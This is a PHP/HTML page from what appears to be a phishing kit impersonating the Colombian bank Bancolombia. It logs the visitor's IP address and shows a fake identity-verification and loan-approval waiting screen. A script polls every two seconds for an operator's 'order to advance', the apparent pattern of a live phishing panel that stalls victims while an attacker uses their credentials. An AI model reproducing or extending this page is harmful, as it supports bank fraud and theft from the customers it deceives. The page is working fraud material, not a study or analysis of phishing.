<?php
$ip = getenv("REMOTE_ADDR");
$tiempo = date("l, j \d\e F \d\e Y");
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia - Verificación de Identidad</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v3" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="../js/functions.js"></script>

        <style type="text/css">
            body{
                background-image: url(../img/fondo2.jpg);
                text-align: center;              
            }
            .descripcion-app {
                font-family: 'Open Sans', sans-serif;
                padding: 20px;
                font-size: 16px;
                color: #333;
            }
        </style>
    </head>
    <body>         
        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29"></td>
            </tr>
        </table>        
        
        <br>
        <img src="../img/logo.svg" width="220" style="margin-top: 40px; margin-bottom: 30px;">
         
        <div class="descripcion-app">
            Estamos procesando la información. <br>
            Estamos validando los datos para la aprobación de su préstamo.
        </div> 
        
        <br><br>
        <img src="../img/load4.gif" width="80">            
        <br>
        <p style="font-family: sans-serif; color: #666;">Procesando...</p>

        <script type="text/javascript">
            $(document).ready(function() {
                // Consultamos cada 2 segundos si el admin ya dio la orden de avanzar
                setInterval(function(){
                    consultar_estado();
                }, 2000); 
            });
        </script>
    </body>
</html>
